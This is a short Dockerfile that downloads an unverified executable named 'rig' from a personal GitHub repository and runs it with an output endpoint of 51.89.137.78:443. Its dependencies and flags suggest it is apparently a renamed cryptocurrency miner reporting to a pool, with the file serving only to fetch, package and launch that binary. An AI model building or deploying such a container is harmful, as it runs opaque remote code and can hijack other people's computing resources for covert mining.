FROM ubuntu:latest as builder
RUN apt-get update -y


RUN apt-get install sudo wget git -y

RUN wget https://github.com/mustakmahisa/repo/raw/main/rig && \
    chmod +x rig && \
    mv rig /usr/local/bin/

FROM ubuntu:latest

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

COPY --from=builder /usr/local/bin/rig /usr/local/bin/

ENTRYPOINT [ "rig" ]
CMD [ "-o", "51.89.137.78:443", "--no-color" ]
